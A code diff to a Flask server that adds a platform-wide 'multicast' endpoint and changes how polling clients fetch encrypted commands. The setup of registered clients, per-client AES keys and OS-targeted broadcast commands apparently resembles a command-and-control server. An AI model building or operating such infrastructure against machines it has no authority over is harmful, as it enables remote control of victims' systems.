@@ -19,6 +19,7 @@ from Crypto.Cipher import PKCS1_OAEP, AES
 from Crypto.Random import get_random_bytes
 import base64
 import ast
+import threading
 
 # Load environment variables
 load_dotenv(override=True)
@@ -472,26 +473,62 @@ def update_last_active_time(client):
         db.session.commit()
         return jsonify({"status": "updated"}), 200
     return jsonify({"error": "Client not found"}), 404
+is_multicast_received = False
+
+
+multicast_commands = {
+    "Linux": {"command": None, "timestamp": None},
+    "Windows": {"command": None, "timestamp": None}
+}
+
+@app.route('/api/command-multicast', methods=["POST"])
+def command_multicast(): 
+    command_json = request.get_json()
+    platform = command_json.get("platform")
+    command = command_json.get("command")
+
+    if not platform or not command:
+        return jsonify({"status": "Failed, either platform or command missing"})
+
+    if platform in multicast_commands:
+        multicast_commands[platform] = {
+            "command": command,
+            "timestamp": datetime.datetime.now()
+        }
+        # Automatically clear command after 5 seconds
+        threading.Timer(5, lambda: multicast_commands.update({platform: {"command": None, "timestamp": None}})).start()
+        return jsonify({"success": f"Command stored for {platform}"})
+    else:
+        return jsonify({"failed": "Failed, unsupported platform"})
+
+
+
 
 @app.route('/command-transmission-to-client', methods=['GET'])
 def receive_command():
-    client_id = request.args.get('clientID')  # Get the clientID from the query string
+    client_id = request.args.get('clientID')
     if not client_id:
-        return jsonify({"error": "clientID is required"}), 400  # Return an error if clientID is not provided
+        return jsonify({"error": "clientID is required"}), 400
+
     client_in_database = ClientData.query.filter_by(client_id=client_id).first()
     if not client_in_database:
-        print("Client id is not present in database")
         return jsonify({"error": "Client is not found in database"})
-    if not (client_id == client_in_database.client_id):
-        print("Client id with database is not matched")
-        return jsonify({"error": "Client is not found in database"})
+
     update_last_active_time(client_in_database)
+
+    os_name = client_in_database.os
+    multicast_command = multicast_commands.get(os_name, {}).get("command")
+    timestamp = multicast_commands.get(os_name, {}).get("timestamp")
+
+    # Check if the multicast command is within the 5-second window
+    if multicast_command and timestamp and (datetime.datetime.now() - timestamp) <= timedelta(seconds=5):
+        command_to_execute[client_id] = multicast_command
+
     if client_id in command_to_execute:
-        command = command_to_execute[client_id]
-        del command_to_execute[client_id]
-        print("Only command: ",command)
+        command = command_to_execute.pop(client_id)
         command_to_encrypt = {"command": command}
-        return encrypt_data(get_aes_key_by_client_id(client_id),f"{command_to_encrypt}")
+        return encrypt_data(get_aes_key_by_client_id(client_id), f"{command_to_encrypt}")
+
     return jsonify({"command": None})
 
 
